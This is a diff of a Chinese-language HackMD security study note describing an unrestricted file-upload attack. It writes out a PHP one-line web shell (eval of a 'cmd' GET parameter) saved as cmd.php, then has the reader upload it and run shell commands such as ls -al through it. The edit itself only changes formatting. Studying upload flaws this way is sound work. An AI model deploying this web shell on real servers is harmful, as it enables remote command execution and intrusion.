@@ -190,9 +190,9 @@
 - ![image](https://hackmd.io/_uploads/rJ-TH1zmyg.png)
 
 - **e.g.(範例攻擊步驟)** : 
-    - (1) **<span class="blue">echo <span class="purple">'<?php eval($_GET["cmd"]); ?>'</span> > <span class="red">cmd.php</span></span>**
+    - (1) **```echo '<?php eval($_GET["cmd"]); ?>' > cmd.php```**
     - (2) **將 cmd.php 檔放入(沒限制的)上傳點並取得結果(產出)**
-    - (3) **將獲得的結果加上 "<span class="blue">cmd = 想要執行的 shell script</span>" (e.g. ```ls -al```)**
+    - (3) **將獲得的結果加上 " ```cmd = 想要執行的 shell script``` " (e.g. ```ls -al```)**
     - (4) **就能夠從結果中獲得額外資訊**
     * ![image](https://hackmd.io/_uploads/H1Kx9j_71e.png)
 
